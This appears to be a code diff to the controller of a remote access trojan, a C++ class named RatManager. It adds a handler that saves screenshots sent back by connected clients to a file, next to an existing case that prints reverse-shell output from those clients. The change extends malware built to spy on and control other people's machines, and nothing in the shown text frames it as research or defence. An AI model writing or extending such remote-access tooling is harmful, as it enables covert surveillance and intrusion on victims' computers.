@@ -1,5 +1,7 @@
 #include "RatManager.h"
 
+#include <fstream>
+
 #include "Trace.h"
 
 RatManager::RatManager(
@@ -101,7 +103,7 @@ void RatManager::OnDisconnection(const int client)
 	Trace("\nClient %d disconnected\n", client);
 }
 
-void RatManager::OnMessage(const int client, const MessageType type, const SharedSpan content)
+void RatManager::OnMessage(const int client, const MessageType type, SharedSpan content)
 {
 	const auto str = content.String();
 
@@ -110,6 +112,12 @@ void RatManager::OnMessage(const int client, const MessageType type, const Share
 		case MessageType::ReverseShellMessage:
 			Trace("%s", str.c_str());
 			break;
+
+		case MessageType::Screenshot:
+			
+			std::ofstream("myfile.png", std::ios::binary).write(content.Data(), content.Size());
+			break;
+
 
 		default:
 			Trace(
